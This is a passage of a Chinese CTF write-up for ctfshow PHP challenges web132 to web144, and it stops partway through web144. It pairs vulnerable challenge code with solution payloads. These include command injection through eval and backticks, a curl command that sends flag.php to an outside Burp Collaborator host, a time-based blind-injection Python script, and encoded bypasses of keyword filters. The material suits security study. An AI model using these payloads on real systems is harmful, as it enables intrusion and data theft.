title=\"web132\"></a>web132</h3><p>扫出&#x2F;admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class=\"line\">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class=\"line\">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这题的突破点在于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false &amp;&amp; false || true)&#123;</span><br><span class=\"line\">\techo &quot;true!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;false!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//返回结果为true</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=admin&amp;password=admin&amp;username=admin</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web133\"><a href=\"#web133\" class=\"headerlink\" title=\"web133\"></a>web133</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;6个字母都还不够呀?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get传参   F=`$F `;sleep 3</span><br><span class=\"line\">经过substr($F,0,6)截取后 得到  `$F `;</span><br><span class=\"line\">也就是会执行 eval(&quot;`$F `;&quot;);</span><br><span class=\"line\">我们把原来的$F带进去</span><br><span class=\"line\">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class=\"line\">也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class=\"line\">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class=\"line\">这样就在服务器上成功执行了 sleep 3</span><br><span class=\"line\">所以 最后就是一道无回显的RCE题目了</span><br></pre></td></tr></table></figure>\n\n<p>无回显我们可以用反弹shell 或者curl外带 或者盲注<br> 这里的话反弹没有成功，但是可以外带。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl  http://xxx:4567?p=`tac f*`</span><br></pre></td></tr></table></figure>\n\n<p>当然要是没有公网ip的话，bp也可以帮到我们这个忙</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key1 = 0;</span><br><span class=\"line\">$key2 = 0;</span><br><span class=\"line\">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class=\"line\">    die(&quot;nonononono&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class=\"line\">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用<code>extract</code>进行变量覆盖</p>\n<p>测试一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">var_dump($_POST);</span><br><span class=\"line\">//然后我们传入 _POST[‘a’]=123</span><br><span class=\"line\">会发现输出的结果为array(1) &#123; [&quot;‘a’&quot;]=&gt; string(3) “123” &#125;</span><br><span class=\"line\">也就是说现在的$_POST[‘a’]存在并且值为123</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web135\"><a href=\"#web135\" class=\"headerlink\" title=\"web135\"></a>web135</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?F=`$F` ;cp flag.php 2.txt;</span><br><span class=\"line\">?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>虽然过滤了很多，但是在linux中我们可以用tee写文件</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls|tee 1.txt</span><br><span class=\"line\">ls / |tee 1.txt</span><br><span class=\"line\">cat /f* |1.txt</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]); </span><br></pre></td></tr></table></figure>\n\n<p>很简单，直接调用ctfshow类里的getFlag方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>\n\n<p>借用yu22x师傅的拓展</p>\n<blockquote>\n<p>php中 -&gt;与:: 调用类中的成员的区别<br>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法.</p>\n<p><strong>也就是说双冒号可以不用实例化类就可以直接调用类中的方法</strong></p>\n</blockquote>\n<h3 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class=\"line\">    die(&quot;private function&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>相比于上一题，这个题过滤了冒号</p>\n<p>call_user_func中不但可以传字符串也可以传数组</p>\n<p>本地测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class=\"line\">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>只能盲打咯</p>\n<p>脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import string</span><br><span class=\"line\">str=string.digits+string.ascii_lowercase+&quot;-&quot;</span><br><span class=\"line\">result=&quot;&quot;</span><br><span class=\"line\">key=0</span><br><span class=\"line\">for j in range(1,45):</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">    if key==1:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    for n in str:</span><br><span class=\"line\">        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class=\"line\">        #print(payload)</span><br><span class=\"line\">        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            requests.get(url,timeout=(2.5,2.5))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            result=result+n</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class=\"line\">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class=\"line\">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class=\"line\">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class=\"line\">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class=\"line\">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class=\"line\">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>这里进行的是弱比较,可以用null绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = eval(&quot;return $f1($f2());&quot;); </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(phpinfo())</span><br><span class=\"line\">md5(sleep())</span><br><span class=\"line\">md5(md5())</span><br><span class=\"line\">current(localeconv)</span><br><span class=\"line\">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br></pre></td></tr></table></figure>\n\n<p>实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件</p>\n<h3 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>/^\\W+$/</code> 作用是匹配非数字字母下划线的字符,</p>\n<p>看看下面这句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>显然这里的<code>phpinfo()</code>是不执行的，但数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>是可以执行phpinfo()命令的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1-phpinfo();&quot;);//可以执行</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1))&#123;</span><br><span class=\"line\">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class=\"line\">        sleep($d);</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这里我们令<code>v1=0</code>就可以让<code>$d=0</code></p>\n<h3 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了加减，我们可以用乘除，过滤了取反我们可以用异或</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 